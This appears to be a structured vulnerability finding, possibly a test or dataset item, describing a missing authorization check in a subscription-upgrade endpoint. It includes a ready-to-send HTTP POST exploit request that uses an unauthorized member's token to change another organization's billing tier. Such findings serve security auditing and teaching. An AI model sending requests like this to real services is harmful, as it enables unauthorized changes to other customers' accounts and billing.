diagnosis: The subscription upgrade endpoint uses Zod middleware to validate payload structure and UUID syntax, but blindly uses req.validatedBody.organizationId to execute the billing modification. It never verifies that the authenticated caller has billing administrator rights for the specified organizationId, allowing an attacker to upgrade or alter subscription tiers of other companies.
exploit_request:
POST /api/billing/subscriptions/upgrade HTTP/1.1
Host: billing.saas.internal:7001
Authorization: Bearer <unauthorized_member_jwt>
Content-Type: application/json

{
  "organizationId": "e8b5d3c2-7a1f-4f2b-9e3d-1a2b3c4d5e6f",
  "targetTier": "ENTERPRISE_ANNUAL",
  "seatsCount": 500
}
